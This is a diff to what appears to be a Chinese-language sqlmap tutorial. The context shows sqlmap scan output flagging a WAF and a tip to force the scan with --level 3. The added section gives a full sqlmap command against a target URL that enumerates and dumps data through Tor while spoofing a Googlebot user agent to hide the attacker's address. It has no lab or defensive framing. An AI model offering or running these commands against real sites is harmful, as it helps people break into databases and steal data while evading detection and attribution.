@@ -34,3 +34,11 @@ python sqlmap.py -l /Desktop/inject.txt
     [15:10:22] [WARNING] there is a possibility that the target (or WAF/IPS/IDS) is resetting 'suspicious' requests
     [15:10:23] [CRITICAL] WAF/IPS/IDS identified as 'Generic (Unknown)'
 可以在后面加上参数 --level 3 来强制扫描
+
+
+匿名
+使用sqlmap和Onion路由器来保护你的IP，DNS等等，在linux中，在终端命令符为$时使用sudo apt-get install tor tor-geoip
+进入sqlmap的目录后:./sqlmap.py -u “http://www.targetvuln.com/index/php?cata_id=1” -b -a -tor –check-tor–user-agent=”Mozilla/5.0(compatible;Googlebot/2.1;+http://www.google.com/bot.html)”
+参数–tor使用Tor，–check-tor会检查Tor是否被正确地使用，如果没有正确被使用，终端会提示错误信息。用户代理是googlebot，所有你的请求会被看起来像是Googlebot发出的一样。
+利用sqlmap的Tor我们能够设置你的TOR代理来隐藏实际请求产生的地址
+-tor-port，-tor-type：这两个参数能够帮你手动设置TOR代理，–check-tor参数会检查你的代理是否被正确地安装并正常的工作。
